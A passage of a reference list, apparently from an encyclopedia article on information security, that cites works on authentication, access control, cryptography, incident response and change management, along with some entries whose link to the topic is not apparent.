10.17487/rfc1929
. Retrieved 
January 18,
 2022
.




^
 
Kirk, John; Wall, Christine (2011), 
"Teller, Seller, Union Activist: Class Formation and Changing Bank Worker Identities"
, 
Work and Identity
, London: Palgrave Macmillan UK, pp. 124–148, 
doi
:
10.1057/9780230305625_6
, 
ISBN
 
978-1-349-36871-6
, retrieved 
June 1,
 2021




^
 
Dewi, Mila Nurmala (December 23, 2020). 
"Perbandingan Kinerja Teller Kriya Dan Teller Organik Pt. Bank Syariah Mandiri"
. 
Nisbah: Jurnal Perbankan Syariah
. 
6
 (2): 75. 
doi
:
10.30997/jn.v6i2.1932
. 
ISSN
 
2528-6633
. 
S2CID
 
234420571
.




^
 
Vile, John (2013), 
"License Checks"
, 
Encyclopedia of the Fourth Amendment
, Washington DC: CQ Press, 
doi
:
10.4135/9781452234243.n462
, 
ISBN
 
978-1-60426-589-7
, retrieved 
June 1,
 2021




^
 
"He Said/She Said"
, 
My Ghost Has a Name
, University of South Carolina Press, pp. 17–32, 
doi
:
10.2307/j.ctv6wgjjv.6
, 
ISBN
 
978-1-61117-827-2
, retrieved 
May 29,
 2021




^
 
Bacigalupo, Sonny A.; Dixon, Linda K.; Gubbins, Simon; Kucharski, Adam J.; Drewe, Julian A. (October 26, 2020). 
"Supplemental Information 8: Methods used to monitor different types of contact"
. 
PeerJ
. 
8
: e10221. 
doi
:
10.7717/peerj.10221/supp-8
.




^
 
Igelnik, Boris M.; Zurada, Jacek (2013). 
Efficiency and scalability methods for computational intellect
. Information Science Reference. 
ISBN
 
978-1-4666-3942-3
. 
OCLC
 
833130899
.




^
 
"The Insurance Superbill Must Have Your Name as the Provider"
, 
Before You See Your First Client
, Routledge, pp. 37–38, January 1, 2005, 
doi
:
10.4324/9780203020289-11
, 
ISBN
 
978-0-203-02028-9
, retrieved 
June 1,
 2021




^
 
Kissell, Joe. 
Take Control of Your Passwords
. 
ISBN
 
978-1-4920-6638-5
. 
OCLC
 
1029606129
.




^
 
"New smart Queensland driver license announced"
. 
Card Technology Today
. 
21
 (7): 5. July 2009. 
doi
:
10.1016/s0965-2590(09)70126-4
. 
ISSN
 
0965-2590
.




^
 
Lawrence Livermore National Laboratory. United States. Department of Energy. Office of Scientific and Technical Information (1995). 
A human engineering and ergonomic evaluation of the security access panel interface
. United States. Dept. of Energy. 
OCLC
 
727181384
.




^
 
Lee, Paul (April 2017). 
"Prints charming: how fingerprints are trailblazing mainstream biometrics"
. 
Biometric Technology Today
. 
2017
 (4): 8–11. 
doi
:
10.1016/s0969-4765(17)30074-7
. 
ISSN
 
0969-4765
.




^
 
Landrock, Peter (2005). "Two-Factor Authentication". 
Encyclopedia of Cryptography and Security
. p. 638. 
doi
:
10.1007/0-387-23483-7_443
. 
ISBN
 
978-0-387-23473-1
.




^
 
"Figure 1.5. Marriage remains the most common form of partnership among couples, 2000-07"
. 
doi
:
10.1787/888932392533
. Retrieved 
June 1,
 2021
.




^
 
Akpeninor, James Ohwofasa (2013). 
Modern Concepts of Security
. Bloomington, IN: AuthorHouse. p. 135. 
ISBN
 
978-1-4817-8232-6
. Retrieved 
January 18,
 2018
.




^
 
Richards, G. (April 2012). 
"One-Time Password (OTP) Pre-Authentication"
. 
doi
:
10.17487/rfc6560
.




^
 
Schumacher, Dietmar (April 3, 2016). 
"Surface geochemical exploration after 85 years: What has been accomplished and what more must be done"
. 
International Conference and Exhibition, Barcelona, Spain, 3-6 April 2016
. SEG Global Meeting Abstracts. Society of Exploration Geophysicists and American Association of Petroleum Geologists. p. 100. 
doi
:
10.1190/ice2016-6522983.1
.




^
 
"Authorization And Approval Program"
, 
Internal Controls Policies and Procedures
, Hoboken, NJ, US: John Wiley & Sons, Inc., pp. 69–72, October 23, 2015, 
doi
:
10.1002/9781119203964.ch10
, 
ISBN
 
978-1-119-20396-4
, retrieved 
June 1,
 2021




^
 
"What responses under what conditions?"
, 
Local Policies and the European Social Fund
, Policy Press, pp. 81–102, October 2, 2019, 
doi
:
10.2307/j.ctvqc6hn1.12
, 
ISBN
 
978-1-4473-4652-4
, 
S2CID
 
241438707
, retrieved 
June 1,
 2021




^
 
Cheng, Liang; Zhang, Yang; Han, Zhihui (June 2013). 
"Quantitatively Measure Access Control Mechanisms across Different Operating Systems"
. 
2013 IEEE 7th International Conference on Software Security and Reliability
. IEEE. pp. 50–59. 
doi
:
10.1109/sere.2013.12
. 
ISBN
 
978-1-4799-0406-8
. 
S2CID
 
13261344
.




^ 
a
 
b
 
Weik, Martin H. (2000), "discretionary access control", 
Computer Science and Communications Dictionary
, p. 426, 
doi
:
10.1007/1-4020-0613-6_5225
, 
ISBN
 
978-0-7923-8425-0




^
 
Grewer, C.; Balani, P.; Weidenfeller, C.; Bartusel, T.; Zhen Tao; Rauen, T. (August 10, 2005). 
"Individual Subunits of the Glutamate Transporter EAAC1 Homotrimer Function Independently of Each Other"
. 
Biochemistry
. 
44
 (35): 11913–11923. 
doi
:
10.1021/bi050987n
. 
PMC
 
2459315
. 
PMID
 
16128593
.




^
 
Ellis Ormrod, Jeanne (2012). 
Essentials of educational psychology: big ideas to guide effective teaching
. Pearson. 
ISBN
 
978-0-13-136727-2
. 
OCLC
 
663953375
.




^
 
Belim, S. V.; Bogachenko, N. F.; Kabanov, A. N. (November 2018). 
"Severity Level of Permissions in Role-Based Access Control"
. 
2018 Dynamics of Systems, Mechanisms and Machines (Dynamics)
. IEEE. pp. 1–5. 
arXiv
:
1812.11404
. 
doi
:
10.1109/dynamics.2018.8601460
. 
ISBN
 
978-1-5386-5941-0
. 
S2CID
 
57189531
.




^
 
"Configuring TACACS and Extended TACACS", 
Securing and Controlling Cisco Routers
, Auerbach Publications, May 15, 2002, 
doi
:
10.1201/9781420031454.ch11
, 
ISBN
 
978-0-8493-1290-8




^
 
"Developing Effective Security Policies"
, 
Risk Analysis and Security Countermeasure Selection
, CRC Press, pp. 261–274, December 18, 2009, 
doi
:
10.1201/9781420078718-18
, 
ISBN
 
978-0-429-24979-2
, retrieved 
June 1,
 2021




^
 
"The Use of Audit Trails to Monitor Key Networks and Systems Should Remain Part of the Computer Security Material Weakness"
. 
www.treasury.gov
. Retrieved 
October 6,
 2017
.




^
 
"fixing-canadas-access-to-medicines-regime-what-you-need-to-know-about-bill-c398"
. 
Human Rights Documents online
. 
doi
:
10.1163/2210-7975_hrd-9902-0152
. Retrieved 
June 1,
 2021
.




^
 
Salazar, Mary K. (January 2006). 
"Dealing with Uncertain Risks—When to Apply the Precautionary Principle"
. 
AAOHN Journal
. 
54
 (1): 11–13. 
doi
:
10.1177/216507990605400102
. 
ISSN
 
0891-0162
. 
S2CID
 
87769508
.




^
 
"We Need to Know More About How the Government Censors Its Employees"
. 
Human Rights Documents Online
. 
doi
:
10.1163/2210-7975_hrd-9970-2016117
. Retrieved 
June 1,
 2021
.




^
 
Pournelle, Jerry (April 22, 2004), 
"1001 Computer Words You Need to Know"
, 
1001 Computer Words You Need to Know: The Ultimate Guide To The Language Of Computers
, Oxford Scholarship Online, Oxford University Press, 
doi
:
10.1093/oso/9780195167757.003.0007
, 
ISBN
 
978-0-19-516775-7
, retrieved 
July 30,
 2021




^
 
Easttom, William (2021), 
"Elliptic Curve Cryptography"
, 
Modern Cryptography
, Cham: Springer International Publishing, pp. 245–256, 
doi
:
10.1007/978-3-030-63115-4_11
, 
ISBN
 
978-3-030-63114-7
, 
S2CID
 
234106555
, retrieved 
June 1,
 2021




^
 
Follman, Rebecca (March 1, 2014). 
From Someone Who Has Been There: Information Seeking in Mentoring
. 
IConference 2014 Proceedings
 (Thesis). iSchools. 
doi
:
10.9776/14322
. 
hdl
:
1903/14292
. 
ISBN
 
978-0-9884900-1-7
.




^
 
Weiss, Jason (2004), 
"Message Digests, Message Authentication Codes, and Digital Signatures"
, 
Java Cryptography Extensions
, Elsevier, pp. 101–118, 
doi
:
10.1016/b978-012742751-5/50012-8
, 
ISBN
 
978-0-12-742751-5
, retrieved 
June 5,
 2021




^
 
Bider, D. (March 2018). 
"Use of RSA Keys with SHA-256 and SHA-512 in the Secure Shell (SSH) Protocol"
 
(PDF)
. The RFC Series. 
doi
:
10.17487/RFC8332
. Retrieved 
November 30,
 2023
.




^
 
Noh, Jaewon; Kim, Jeehyeong; Kwon, Giwon; Cho, Sunghyun (October 2016). 
"Secure key exchange scheme for WPA/WPA2-PSK using public key cryptography"
. 
2016 IEEE International Conference on Consumer Electronics-Asia (ICCE-Asia)
. IEEE. pp. 1–4. 
doi
:
10.1109/icce-asia.2016.7804782
. 
ISBN
 
978-1-5090-2743-9
. 
S2CID
 
10595698
.




^
 
Van Buren, Roy F. (May 1990). 
"How you can use the data encryption standard to encrypt your files and data bases"
. 
ACM SIGSAC Review
. 
8
 (2): 33–39. 
doi
:
10.1145/101126.101130
. 
ISSN
 
0277-920X
.




^
 
Bonneau, Joseph (2016), 
"Why Buy when You Can Rent?"
, 
Financial Cryptography and Data Security
, Lecture Notes in Computer Science, vol. 9604, Berlin, Heidelberg: Springer Berlin Heidelberg, pp. 19–26, 
doi
:
10.1007/978-3-662-53357-4_2
, 
ISBN
 
978-3-662-53356-7
, 
S2CID
 
18122687
, retrieved 
June 5,
 2021




^
 
Coleman, Heather; Andron, Jeff (August 1, 2015), 
"What GIS Experts and Policy Professionals Need to Know about Using Marxan in Multiobjective Planning Processes"
, 
Ocean Solutions, Earth Solutions
, Esri Press, 
doi
:
10.17128/9781589483651_2
, 
ISBN
 
978-1-58948-365-1
, retrieved 
June 5,
 2021




^ 
a
 
b
 
Landrock, Peter (2005), "Key Encryption Key", 
Encyclopedia of Cryptography and Security
, pp. 326–327, 
doi
:
10.1007/0-387-23483-7_220
, 
ISBN
 
978-0-387-23473-1




^
 
Giri, Debasis; Barua, Prithayan; Srivastava, P. D.; Jana, Biswapati (2010), "A Cryptosystem for Encryption and Decryption of Long Confidential Messages", 
Information Security and Assurance
, Communications in Computer and Information Science, vol. 76, Berlin, Heidelberg: Springer Berlin Heidelberg, pp. 86–96, 
Bibcode
:
2010isa..conf...86G
, 
doi
:
10.1007/978-3-642-13365-7_9
, 
ISBN
 
978-3-642-13364-0
, retrieved 
June 5,
 2021




^
 
Vallabhaneni, S.R. (2008). 
Corporate Management, Governance, and Ethics Best Practices
. John Wiley & Sons. p. 288. 
ISBN
 
9780470255803
.




^
 
Shon Harris
 (2003). 
All-in-one CISSP Certification Exam Guide
 (2nd ed.). 
Emeryville, California
: 
McGraw-Hill
/Osborne. 
ISBN
 
978-0-07-222966-0
.




^
 
Boncardo, Robert (September 20, 2018). 
"Jean-Claude Milner's Mallarmé: Nothing Has Taken Place"
. 
Edinburgh University Press
. 
1
. 
doi
:
10.3366/edinburgh/9781474429528.003.0005
. 
S2CID
 
172045429
.




^
 
"The Importance of Operational Due Diligence"
, 
Hedge Fund Operational Due Diligence
, Hoboken, NJ, US: John Wiley & Sons, Inc., pp. 49–67, October 16, 2015, 
doi
:
10.1002/9781119197485.ch2
, 
ISBN
 
978-1-119-19748-5
, retrieved 
June 5,
 2021




^
 
Hall, Gaylord C. (March 1917). 
"Some Important Diagnostic Points the General Practioner [
sic
] Should Know About the Nose"
. 
Southern Medical Journal
. 
10
 (3): 211. 
doi
:
10.1097/00007611-191703000-00007
. 
ISSN
 
0038-4348
.




^
 
Renes, J. (1999). 
Landschappen van Maas en Peel: een toegepast historisch-geografisch onderzoek in het streekplangebied Noord- en Midden-Limburg
. Eisma. 
ISBN
 
90-74252-84-2
. 
OCLC
 
782897414
.




^
 
Thomas, Brook (June 22, 2017). 
"Minding Previous Steps Taken"
. 
Oxford Scholarship Online
. 
doi
:
10.1093/acprof:oso/9780190456368.003.0002
. 
ISBN
 
978-0-19-045639-9
.




^
 
Lundgren, Regina E. (2018). 
Risk communication : a handbook for communicating environmental, safety, and health risks
. Wiley. 
ISBN
 
978-1-119-45613-1
. 
OCLC
 
1043389392
.




^
 
Jensen, Eric Talbot (December 3, 2020), 
"Due Diligence in Cyber Activities"
, 
Due Diligence in the International Legal Order
, Oxford University Press, pp. 252–270, 
doi
:
10.1093/oso/9780198869900.003.0015
, 
ISBN
 
978-0-19-886990-0
, retrieved 
June 5,
 2021




^
 
"The Duty of Care Risk Analysis Standard"
. 
DoCRA
. Archived from 
the original
 on August 14, 2018
. Retrieved 
August 15,
 2018
.




^
 
Sutton, Adam; Cherney, Adrian; White, Rob (2008), 
"Evaluating crime prevention"
, 
Crime Prevention
, Cambridge: Cambridge University Press, pp. 70–90, 
doi
:
10.1017/cbo9780511804601.006
, 
ISBN
 
978-0-511-80460-1
, retrieved 
June 5,
 2021




^
 
Check, Erika (September 15, 2004). 
"FDA considers antidepressant risks for kids"
. 
Nature
. 
doi
:
10.1038/news040913-15
. 
ISSN
 
0028-0836
.




^
 
Auckland, Cressida (August 16, 2017). 
"Protecting me from my Directive: Ensuring Appropriate Safeguards for Advance Directives in Dementia"
. 
Medical Law Review
. 
26
 (1): 73–97. 
doi
:
10.1093/medlaw/fwx037
. 
ISSN
 
0967-0742
. 
PMID
 
28981694
.




^
 
Takach, George S. (2016), 
"Preparing for Breach Litigation"
, 
Data Breach Preparation and Response
, Elsevier, pp. 217–230, 
doi
:
10.1016/b978-0-12-803451-4.00009-5
, 
ISBN
 
978-0-12-803451-4
, retrieved 
June 5,
 2021




^
 
Westby, J.R.; Allen, J.H. (August 2007). 
"Governing for Enterprise Security (GES) Implementation Guide"
 
(PDF)
. Software Engineering Institute
. Retrieved 
January 25,
 2018
.




^
 
Fowler, Kevvie (2016), 
"Developing a Computer Security Incident Response Plan"
, 
Data Breach Preparation and Response
, Elsevier, pp. 49–77, 
doi
:
10.1016/b978-0-12-803451-4.00003-4
, 
ISBN
 
978-0-12-803451-4
, retrieved 
June 5,
 2021




^
 
Bisogni, Fabio (2016). "Proving Limits of State Data Breach Notification Laws: Is a Federal Law the Most Adequate Solution?". 
Journal of Information Policy
. 
6
: 154–205. 
doi
:
10.5325/jinfopoli.6.2016.0154
. 
JSTOR
 
10.5325/jinfopoli.6.2016.0154
.




^
 
"Understanding Plan for Every Part"
, 
Turbo Flow
, Productivity Press, pp. 21–30, July 27, 2017, 
doi
:
10.1201/b10336-5
, 
ISBN
 
978-0-429-24603-6
, retrieved 
June 5,
 2021




^ 
a
 
b
 
Wills, Leonard (February 27, 2019). 
"A Brief Guide to Handling a Cyber Incident"
. 
American Bar Association
.




^
 
Johnson, Leighton R. (2014), 
"Part 1. Incident Response Team"
, 
Computer Incident Response and Forensics Team Management
, Elsevier, pp. 17–19, 
doi
:
10.1016/b978-1-59749-996-5.00038-8
, 
ISBN
 
978-1-59749-996-5
, retrieved 
June 5,
 2021




^
 
"Computer Incident Response and Forensics Team Management"
. 
Network Security
. 
2014
 (2): 4. February 2014. 
doi
:
10.1016/s1353-4858(14)70018-2
. 
ISSN
 
1353-4858
.




^
 
"Cybersecurity Threat Landscape and Future Trends"
, 
Cybersecurity
, Routledge, pp. 304–343, April 16, 2015, 
doi
:
10.1201/b18335-12
, 
ISBN
 
978-0-429-25639-4
, retrieved 
June 5,
 2021




^
 
Information technology. Security techniques. Information security incident management
, BSI British Standards, 
doi
:
10.3403/30268878u
, retrieved 
June 5,
 2021




^
 
Turner, Tim (September 7, 2011), 
"Our Beginning: Team Members Who Began the Success Story"
, 
One Team on All Levels
, Productivity Press, pp. 9–36, 
doi
:
10.4324/9781466500020-2
, 
ISBN
 
978-0-429-25314-0
, retrieved 
June 5,
 2021




^
 
Erlanger, Leon (2002). 
Defensive Strategies
. PC Magazine. p. 70.




^
 
"of Belgrade's main street. The event took place in absolute"
, 
Radical Street Performance
, Routledge, pp. 81–83, November 5, 2013, 
doi
:
10.4324/9781315005140-28
, 
ISBN
 
978-1-315-00514-0
, retrieved 
June 5,
 2021




^
 
"Why Choice Matters So Much and What Can be Done to Preserve It". 
The Manipulation of Choice
. Palgrave Macmillan. 2013. 
doi
:
10.1057/9781137313577.0010
. 
ISBN
 
978-1-137-31357-7
.




^ 
a
 
b
 
c
 
"Computer Security Incident Handling Guide"
 
(PDF)
. 
Nist.gov
. 2012.




^
 
Borgström, Pernilla; Strengbom, Joachim; Viketoft, Maria; Bommarco, Riccardo (April 4, 2016). 
"Table S3: Results from linear-mixed models where non-signficant [
sic
] parameters have not been removed"
. 
PeerJ
. 
4
: e1867. 
doi
:
10.7717/peerj.1867/supp-3
.




^
 
Penfold, David (2000), "Selecting, Copying, Moving and Deleting Files and Directories", 
ECDL Module 2: Using the Computer and Managing Files
, London: Springer London, pp. 86–94, 
doi
:
10.1007/978-1-4471-0491-9_6
, 
ISBN
 
978-1-85233-443-7




^
 
Gumus, Onur (2018). 
ASP. NET Core 2 Fundamentals : Build Cross-Platform Apps and Dynamic Web Services with This Server-side Web Application Framework
. Packt Publishing Ltd. 
ISBN
 
978-1-78953-355-2
. 
OCLC
 
1051139482
.




^
 
"Do the Students Understand What They Are Learning?"
, 
Trouble-shooting Your Teaching
, Routledge, pp. 36–40, February 25, 2005, 
doi
:
10.4324/9780203416907-8
, 
ISBN
 
978-0-203-41690-7
, retrieved 
June 5,
 2021




^
 
"Where Are Films Restored, Where Do They Come From and Who Restores Them?", 
Film Restoration
, Palgrave Macmillan, 2013, 
doi
:
10.1057/9781137328724.0006
, 
ISBN
 
978-1-137-32872-4




^
 
Liao, Qi; Li, Zhen; Striegel, Aaron (January 24, 2011). 
"Could firewall rules be public - a game theoretical perspective"
. 
Security and Communication Networks
. 
5
 (2): 197–210. 
doi
:
10.1002/sec.307
. 
ISSN
 
1939-0114
.




^
 
Boeckman, Philip; Greenwald, David J.; Von Bismarck, Nilufer (2013). 
Twelfth annual institute on securities regulation in Europe : overcoming deal-making challenges in the current markets
. Practising Law Institute. 
ISBN
 
978-1-4024-1932-4
. 
OCLC
 
825824220
.




^
 
"Figure 1.8. Spending of social security has been growing, while self-financing has been falling"
. 
doi
:
10.1787/888932459242
. Retrieved 
June 5,
 2021
.




^
 
"Information Governance: The Crucial First Step"
, 
Safeguarding Critical E-Documents
, Hoboken, NJ, US: John Wiley & Sons, Inc., pp. 13–24, September 19, 2015, 
doi
:
10.1002/9781119204909.ch2
, 
ISBN
 
978-1-119-20490-9
, retrieved 
June 5,
 2021




^
 
He, Ying (December 1, 2017). 
"Challenges of Information Security Incident Learning: An Industrial Case Study in a Chinese Healthcare Organization"
 
(PDF)
. 
Informatics for Health and Social Care
. 
42
 (4): 394–395. 
doi
:
10.1080/17538157.2016.1255629
. 
PMID
 
28068150
. 
S2CID
 
20139345
.




^
 
Kampfner, Roberto R. (1985). 
"Formal specification of information systems requirements"
. 
Information Processing & Management
. 
21
 (5): 401–414. 
doi
:
10.1016/0306-4573(85)90086-x
. 
ISSN
 
0306-4573
.




^
 
Jenner, H.A. (1995). 
Assessment of ecotoxicological risks of element leaching from pulverized coal ashes
. s.n.] 
OCLC
 
905474381
.




^
 
"Desktop Computers: Software"
. 
Practical Pathology Informatics
. New York: Springer-Verlag. 2006. pp. 51–82. 
doi
:
10.1007/0-387-28058-8_3
. 
ISBN
 
0-387-28057-X
. Retrieved 
June 5,
 2021
.




^
 
Wilby, R.L.; Orr, H.G.; Hedger, M.; Forrow, D.; Blackmore, M. (December 2006). 
"Risks posed by climate change to the delivery of Water Framework Directive objectives in the UK"
. 
Environment International
. 
32
 (8): 1043–1055. 
Bibcode
:
2006EnInt..32.1043W
. 
doi
:
10.1016/j.envint.2006.06.017
. 
ISSN
 
0160-4120
. 
PMID
 
16857260
.




^
 
Campbell, T. (2016). 
"Chapter 14: Secure Systems Development"
. 
Practical Information Security Management: A Complete Guide to Planning and Implementation
. Apress. p. 218. 
ISBN
 
9781484216859
.




^
 
Koppelman, Kent L. (2011). 
Understanding human differences : multicultural education for a diverse America
. Pearson/Allyn & Bacon. 
OCLC
 
1245910610
.




^
 
"Post-processing"
. 
Simple Scene, Sensational Shot
. Routledge. April 12, 2013. pp. 128–147. 
doi
:
10.4324/9780240821351-9
. 
ISBN
 
978-0-240-82135-1
. Retrieved 
June 5,
 2021
.




^
 
Kumar, Binay; Mahto, Tulsi; Kumari, Vinita; Ravi, Binod Kumar; Deepmala (2016). 
"Quackery: How It Can Prove Fatal Even in Apparently Simple Cases-A Case Report"
. 
Medico-Legal Update
. 
16
 (2): 75. 
doi
:
10.5958/0974-1283.2016.00063.3
. 
ISSN
 
0971-720X
.




^
 
Priest, Sally (February 22, 2019). 
"Shared roles and responsibilities in flood risk management"
. 
Journal of Flood Risk Management
. 
12
 (1): e12528. 
Bibcode
:
2019JFRM...12E2528P
. 
doi
:
10.1111/jfr3.12528
. 
ISSN
 
1753-318X
. 
S2CID
 
133789858
.




^
 
United States. Department of Energy. Office of Inspector General. Office of Scientific and Technical Information (2009). 
Audit Report, "Fire Protection Deficiencies at Los Alamos National Laboratory."
. United States. Dept. of Energy. 
OCLC
 
727225166
.




^
 
Toms, Elaine G. (January 1992). 
"Managing change in libraries and information services; A systems approach"
. 
Information Processing & Management
. 
28
 (2): 281–282. 
doi
:
10.1016/0306-4573(92)90052-2
. 
ISSN
 
0306-4573
.




^
 
Abolhassan, Ferri (2003). 
"The Change Management Process Implemented at IDS Scheer"
. 
Business Process Change Management
. Berlin, Heidelberg: Springer Berlin Heidelberg. pp. 15–22. 
doi
:
10.1007/978-3-540-24703-6_2
. 
ISBN
 
978-3-642-05532-4
. Retrieved 
June 5,
 2021
.




^
 
Dawson, Chris (July 1, 2020). 
Leading Culture Change
. 
doi
:
10.1515/9780804774673
. 
ISBN
 
9780804774673
. 
S2CID
 
242348822
.




^
 
McCormick, Douglas P. (March 22, 2016). 
Family Inc. : using business principles to maximize your family's wealth
. John Wiley & Sons. 
ISBN
 
978-1-119-21976-7
. 
OCLC
 
945632737
.




^
 
Schuler, Rainer (August 1995). 
"Some properties of sets tractable under every polynomial-time computable distribution"
. 
Information Processing Letters
. 
55
 (4): 179–184. 
doi
:
10.1016/0020-0190(95)00108-o
. 
ISSN
 
0020-0190
.




^
 
"Figure 12.2. Share of own-account workers who generally do not have more than one client"
 
(Excel)
. 
doi
:
10.1787/888933881610
. Retrieved 
June 5,
 2021
.




^
 
"Multi-user file server for DOS LANs"
. 
Computer Communications
. 
10
 (3): 153. June 1987. 
doi
:
10.1016/0140-3664(87)90353-7
. 
ISSN
 
0140-3664
.




^
 
"Defining Organizational Change"
, 
Organizational Change
, Oxford, UK: Wiley-Blackwell, pp. 21–51, April 19, 2011, 
doi
:
10.1002/9781444340372.ch1
, 
ISBN
 
978-1-4443-4037-2
, retrieved 
June 5,
 2021




^
 
Kirchmer, Mathias; Scheer, August-Wilhelm (2003), 
"Change Management — Key for Business Process Excellence"
, 
Business Process Change Management
, Berlin, Heidelberg: Springer Berlin Heidelberg, pp. 1–14, 
doi
:
10.1007/978-3-540-24703-6_1
, 
ISBN
 
978-3-642-05532-4
, retrieved 
June 5,
 2021




^
 
More, Josh; Stieber, Anthony J.; Liu, Chris (2016), 
"Tier 2—Advanced Help Desk—Help Desk Supervisor"
, 
Breaking Into Information Security
, Elsevier, pp. 111–113, 
doi
:
10.1016/b978-0-12-800783-9.00029-x
, 
ISBN
 
978-0-12-800783-9
, retrieved 
June 5,
 2021




^
 
"An Application of Bayesian Networks in Automated Scoring of Computerized Simulation Tasks"
, 
Automated Scoring of Complex Tasks in Computer-Based Testing
, Routledge, pp. 212–264, April 4, 2006, 
doi
:
10.4324/9780415963572-10
, 
ISBN
 
978-0-415-96357-2
, retrieved 
June 5,
 2021




^
 
Kavanagh, Michael J. (June 1994). 
"Change, Change, Change"
. 
Group & Organization Management
. 
19
 (2): 139–140. 
doi
:
10.1177/1059601194192001
. 
ISSN
 
1059-6011
. 
S2CID
 
144169263
.




^
 
Taylor, J. (2008). "Chapter 10: Understanding the Project Change Process". 
Project Scheduling and Cost Control: Planning, Monitoring and Controlling the Baseline
. J. Ross Publishing. pp. 187–214. 
ISBN
 
9781932159110
.




^
 
"17. Innovation and Change: Can Anyone Do This?"
, 
Backstage in a Bureaucracy
, University of Hawaii Press, pp. 87–96, December 31, 2017, 
doi
:
10.1515/9780824860936-019
, 
ISBN
 
978-0-8248-6093-6
, retrieved 
June 5,
 2021




^
 
Braun, Adam (February 3, 2015). 
Promise of a pencil : how an ordinary person can create extraordinary change
. Simon and Schuster. 
ISBN
 
978-1-4767-3063-9
. 
OCLC
 
902912775
.




^
 
"Describing Within-Person Change Over Time"
, 
Longitudinal Analysis
, Routledge, pp. 235–306, January 30, 2015, 
doi
:
10.4324/9781315744094-14
, 
ISBN
 
978-1-315-74409-4
, retrieved 
June 5,
 2021




^
 
Ingraham, Carolyn; Ban, Patricia W. (1984). 
Legislating bureaucratic change : the Civil Service Reform Act of 1978
. State University of New York Press. 
ISBN
 
0-87395-886-1
. 
OCLC
 
10300171
.




^
 
Wei, J. (May 4, 2000). 
"Preliminary Change Request for the SNS 1.3 GeV-Compatible Ring"
. 
OSTI.GOV
. 
doi
:
10.2172/1157253
. 
OSTI
 
1157253
. Retrieved 
January 18,
 2022
.




^
 
Chen Liang (May 2011). 
"Allocation priority management of agricultural water resources based on the theory of virtual water"
. 
2011 International Conference on Business Management and Electronic Information
. Vol. 1. IEEE. pp. 644–647. 
doi
:
10.1109/icbmei.2011.5917018
. 
ISBN
 
978-1-61284-108-3
. 
S2CID
 
29137725
.




^
 
"Change risks and best practices in Business Change Management Unmanaged change risk leads to problems for change management", 
Leading and Implementing Business Change Management
, Routledge, pp. 32–74, July 18, 2013, 
doi
:
10.4324/9780203073957-9
 (inactive September 11, 2024), 
ISBN
 
978-0-203-07395-7
{{
citation
}}
:  CS1 maint: DOI inactive as of September 2024 (
link
)




^
 
Bragg, Steven M. (2016). 
Accounting Best Practices
. Wiley. 
ISBN
 
978-1-118-41780-5
. 
OCLC
 
946625204
.




^
 
"Successful change requires more than change management"
. 
Human Resource Management International Digest
. 
16
 (7). October 17, 2008. 
doi
:
10.1108/hrmid.2008.04416gad.005
. 
ISSN
 
0967-0734
.




^
 
"Planning for water resources under climate change"
, 
Spatial Planning and Climate Change
, Routledge, pp. 287–313, September 13, 2010, 
doi
:
10.4324/9780203846537-20
, 
ISBN
 
978-0-203-84653-7
, retrieved 
June 5,
 2021




^
 
Rowan, John (January 1967). 
"Answering the computer back"
. 
Management Decision
. 
1
 (1): 51–54. 
doi
:
10.1108/eb000776
. 
ISSN
 
0025-1747
.




^
 
Biswas, Margaret R.; Biswas, Asit K. (February 1981). 
"Climatic change and food production"
. 
Agriculture and Environment
. 
5
 (4): 332. 
doi
:
10.1016/0304-1131(81)90050-3
. 
ISSN
 
0304-1131
.




^
 
Weik, Martin H. (2000), "backout", 
Computer Science and Communications Dictionary
, p. 96, 
doi
:
10.1007/1-4020-0613-6_1259
, 
ISBN
 
978-0-7923-8425-0




^
 
"Editorial Advisory and Review Board"
, 
Business and Sustainability: Concepts, Strategies and Changes
, Critical Studies on Corporate Responsibility, Governance and Sustainability, vol. 3, Emerald Group Publishing Limited, pp. xv–xvii, December 6, 2011, 
doi
:
10.1108/s2043-9059(2011)0000003005
, 
ISBN
 
978-1-78052-438-2
, retrieved 
June 5,
 2021




^
 
"Where a Mirage Has Once Been, Life Must Be"
, 
New and Selected Poems
, University of South Carolina Press, p. 103, 2014, 
doi
:
10.2307/j.ctv6sj8d1.65
, 
ISBN
 
978-1-61117-323-9
, retrieved 
June 5,
 2021




^
 
Bell, Marvin (1983). "Two, When There Might Have Been Three". 
The Antioch Review
. 
41
 (2): 209. 
doi
:
10.2307/4611230
. 
JSTOR
 
4611230
.




^
 
"We can also make change"
. 
Human Rights Documents Online
. 
doi
:
10.1163/2210-7975_hrd-0148-2015175
. Retrieved 
June 5,
 2021
.




^
 
Mazikana, Anthony Tapiwa (November 5, 2020). "
'Change Is the Law of Life. and Those Who Look only to the past or Present Are Certain to Miss the Future- John F. Kennedy' Assessing This Statement with References to Organizations in Zimbabwe Who Have Been Affected by Change". 
SSRN
 
3725707
.




^
 
Ramanadham, V. V. (ed.). 
Privatisation in the UK
. 
ISBN
 
978-0-429-19973-8
. 
OCLC
 
1085890184
.




^
 
"More complex/realistic rheology must be implemented; Numerical convergence tests must be performed"
. 
Geoloscientific Model Development Discussions
. September 22, 2020. 
doi
:
10.5194/gmd-2020-107-rc2
. 
S2CID
 
241597573
.




^
 
Stone, Edward. 
Edward C. Stone Collection
. 
OCLC
 
733102101
.




^
 
Lientz, B (2002). 
"Develop Your Improvement Implementation Plan"
. 
Achieve Lasting Process Improvement
. Elsevier. pp. 151–171. 
doi
:
10.1016/b978-0-12-449984-3.50011-8
. 
ISBN
 
978-0-12-449984-3
. Retrieved 
June 5,
 2021
.




^
 
Smeets, Peter (2009). 
Expeditie agroparken : ontwerpend onderzoek naar metropolitane landbouw en duurzame ontwikkeling
. s.n.] 
ISBN
 
978-90-8585-515-6
. 
OCLC
 
441821141
.




^
 
"Figure 1.3. About 50 percent of the Going for Growth recommendations have been implemented or are in process of implementation"
. 
doi
:
10.1787/888933323735
. Retrieved 
June 5,
 2021
.




^
 
Kekes, John (February 21, 2019), 
"Must Justice Be Done at All Costs?"
, 
Hard Questions
, Oxford University Press, pp. 98–126, 
doi
:
10.1093/oso/9780190919986.003.0005
, 
ISBN
 
978-0-19-091998-6
, retrieved 
June 5,
 2021




^
 
Forrester, Kellie (2014). 
Macroeconomic implications of changes in the composition of the labor force
. University of California, Santa Barbara. 
ISBN
 
978-1-321-34938-2
. 
OCLC
 
974418780
.




^
 
Choudhury, Gagan L.; Rappaport, Stephen S. (October 1981). 
"Demand assigned multiple access systems using collision type request channels"
. 
ACM SIGCOMM Computer Communication Review
. 
11
 (4): 136–148. 
doi
:
10.1145/1013879.802667
. 
ISSN
 
0146-4833
.




^
 
Crinson, Mark (2013). 
"
